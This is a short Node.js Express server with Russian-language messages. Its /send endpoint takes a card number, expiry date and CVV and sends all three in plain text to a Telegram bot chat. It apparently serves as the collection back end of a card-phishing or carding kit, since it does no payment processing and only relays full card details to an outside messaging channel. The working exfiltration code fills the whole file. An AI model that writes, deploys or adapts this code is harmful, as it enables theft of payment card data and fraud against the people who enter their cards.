require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));

app.post('/send', async (req, res) => {
  const { cardNumber, expiry, cvv } = req.body;

  const fullMessage = `💳 Новые платежные данные:\n🔢 Номер карты: ${cardNumber}\n📅 Срок действия: ${expiry}\n🔒 CVV: ${cvv}`;
  const TELEGRAM_API = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;

  try {
    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: fullMessage,
      }),
    });

    res.json({ status: 'Данные успешно отправлены!' });
  } catch (err) {
    console.error('Ошибка при отправке в Telegram:', err);
    res.status(500).json({ status: 'Ошибка при отправке!' });
  }
});

app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});
